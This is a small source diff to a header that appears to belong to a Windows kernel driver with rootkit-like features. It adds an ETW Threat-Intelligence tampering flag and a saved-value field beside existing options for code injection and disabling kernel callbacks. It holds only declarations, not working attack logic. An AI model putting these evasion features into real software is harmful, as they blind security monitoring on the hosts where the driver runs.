@@ -29,6 +29,7 @@ struct EnabledFeatures {
 	bool ProcessProtection		  = true;
 	bool ThreadProtection		  = true;
 	bool FileProtection			  = true;
+	bool EtwTiTamper			  = true;
 	bool ApcInjection			  = true;
 	bool CreateThreadInjection	  = false;
 };
@@ -94,9 +95,11 @@ struct CmCallbacksList {
 struct AntiAnalysisGlobals {
 	DisabledKernelCallback DisabledCallbacks[MAX_KERNEL_CALLBACKS];
 	ULONG DisabledCallbacksCount;
+	ULONG PrevEtwTiValue;
 	FastMutex Lock;
 
 	void Init() {
+		PrevEtwTiValue = 0;
 		DisabledCallbacksCount = 0;
 		Lock.Init();
 	}
